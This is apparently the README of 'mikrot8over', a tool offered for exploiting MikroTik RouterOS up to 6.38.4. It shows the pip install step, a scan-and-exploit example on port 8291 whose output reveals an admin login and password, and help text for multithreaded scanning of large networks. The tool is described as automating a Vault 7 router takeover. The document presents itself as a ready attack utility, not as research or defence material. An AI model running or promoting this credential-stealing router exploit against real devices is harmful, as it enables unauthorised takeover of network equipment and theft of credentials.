# mikrot8over
mikrot8over: Fast exploitation tool for Mikrotik RouterOS up to 6.38.4

[![Current Release](https://img.shields.io/github/release/vulnersCom/mikrot8over.svg "Current Release")](https://github.com/vulnersCom/mikrot8over/releases/latest)

# Description
This is reworked original [Mikrotik Exploit](https://github.com/miladdiaz/MikrotikExploit).
Added Python 2 compatibility and multithreading scan features.

# Python version
Utility was tested on a *python2.6*, *python2.7*, *python3.**
If you have found any bugs, don't hesitate to open issue

# How to install

`pip install mikrot8over`


# Scan and exploit
```
# pip install mikrot8over
# mikrot8over 127.0.0.1
Starting scan for IP 127.0.0.1, port 8291 running in 10 threads
100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 3379.78it/s]
+----------------------+--------------------------------+------------------------------------------------------------------------------------------------------+
|          IP          |             Login              |                                               Password                                               |
+======================+================================+======================================================================================================+
       127.0.0.1                    admin                                                              admin
+----------------------+--------------------------------+------------------------------------------------------------------------------------------------------+
```

# Performance tuning

You can set max threads and socket timeout for large networks scan

```
# pip install mikrot8over
# mikrot8over --help
Usage:
        Mikrotik exploit from Vault 7 CIA Leaks automation tool
        Takeovers up to RouterOS 6.38.4.

        Usage: mikrot8over IP_ADDRESS


Options:
  -h, --help            show this help message and exit
  -p PORT, --port=PORT  List of the port to scan. Default is 8291
  -t THREADS, --threads=THREADS
                        Number of scan threads. Default is 10 that fits the
                        most of systems
  -o TIMEOUT, --timeout=TIMEOUT
                        Socket connection timeout```